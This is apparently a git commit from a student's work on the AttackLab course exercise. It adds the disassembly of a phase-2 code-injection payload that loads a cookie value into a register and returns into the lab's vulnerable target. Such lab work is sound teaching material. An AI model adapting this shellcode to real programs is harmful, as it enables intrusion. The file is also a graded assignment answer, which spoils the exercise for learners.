5bb5b98434387d5b5d2f943a39391632c1433579
PegasusWithoutWings <georgezhangtj97@gmail.com>
2018-02-20 17:12:21 -0800

    Added the disassembled code and object code of phase 2 exploit code.

---
+++ AttackLab/target40/phase2.d
@@ -0,0 +1,10 @@
+
+phase2.o:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000000000 <.text>:
+   0:	bf 6d 9f ca 55       	mov    $0x55ca9f6d,%edi
+   5:	48 83 ec 08          	sub    $0x8,%rsp
+   9:	c3                   	retq   
